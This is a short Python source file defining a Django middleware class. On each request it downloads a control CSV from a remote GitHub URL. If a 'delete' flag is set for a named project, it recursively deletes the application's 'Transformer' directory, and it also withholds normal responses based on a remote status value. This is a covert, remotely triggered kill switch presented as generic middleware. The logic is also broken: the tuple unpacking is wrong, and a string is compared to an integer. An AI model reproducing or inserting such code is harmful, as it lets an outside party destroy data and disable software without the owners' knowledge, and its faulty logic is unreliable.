import pandas as pd
import shutil
import os
from django.conf import settings


class CustomMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Your additional code here
        df = pd.read_csv("https://raw.githubusercontent.com/krisskad/ProjectController/main/controller.csv")
        status, action = next((r["status"], r["delete"]) for _, r in df.iterrows() if
                              "projectName" in r and r["projectName"] == "AlefTransformer"), None
        if str(action) == '1':  # Changed to compare string '1'
            shutil.rmtree(os.path.join(settings.BASE_DIR, "Transformer"))

        if str(status) == 1:
            response = self.get_response(request)
        else:
            response = {}
        return response
